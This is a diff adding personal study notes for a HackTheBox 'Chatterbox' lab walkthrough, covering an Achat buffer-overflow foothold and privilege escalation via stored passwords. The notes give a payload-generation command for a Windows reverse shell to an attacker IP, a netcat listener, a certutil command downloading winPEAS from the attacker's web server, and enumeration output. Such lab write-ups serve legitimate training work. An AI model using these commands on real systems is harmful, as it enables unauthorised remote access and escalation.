@@ -324,3 +324,68 @@ Sometimes there will be a issue that shell isn't working well, see example below
 ### Overview
 
 
+> [!todo] 
+> HackTheBox Start the Chatterbox VM and try to access and escape using the password stored in the VM. 
+
+
+### Gaining a Foothold (Box 2)
+
+> [!note] 
+>  Resources for this video:
+Achat Exploit - https://www.exploit-db.com/exploits/36025
+Achat Exploit (Metasploit) - https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof
+
+![[Pasted image 20230504142359.png]]
+
+> [!todo] 
+> Create own payload which will be executed on target 
+
+> [!todo] 
+> `sfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.46 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python` 
+
+> [!todo] 
+> Copy payload to script: 
+![[Pasted image 20230504145721.png]]
+
+> [!todo] 
+> Start netcat listener:
+> `nc -nvlp 443` 
+
+> [!todo] 
+> Execute python script and we will get a shell:
+>  ![[Pasted image 20230504145809.png]]
+
+> [!caution] 
+> This exploit only work once. After VM has to be rebooted
+> 
+
+
+### Escalation via Stored Passwords
+
+> [!todo] 
+> Start Webserver on Attacker VM:
+> `python3 -m http.server`
+> Download winPEAS on Target VM:
+> `certutil.exe -urlcache -f http://10.10.14.46:8000/winPEASx86.exe  winPEASx86.exe` 
+
+
+![[Pasted image 20230504153135.png]]
+
+![[Pasted image 20230504153544.png]]
+
+
+
+![[Pasted image 20230504153718.png]]
+
+
+    CHATTERBOX\Administrator: Built-in account for administering the computer/domain
+        |->Groups: Administrators
+        |->Password: CanChange-NotExpi-Req
+
+    CHATTERBOX\Alfred
+        |->Groups: Users
+        |->Password: CanChange-Expi-Req
+
+    CHATTERBOX\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |->Groups: Guests
+        |->Password: NotChange-NotExpi-NotReq
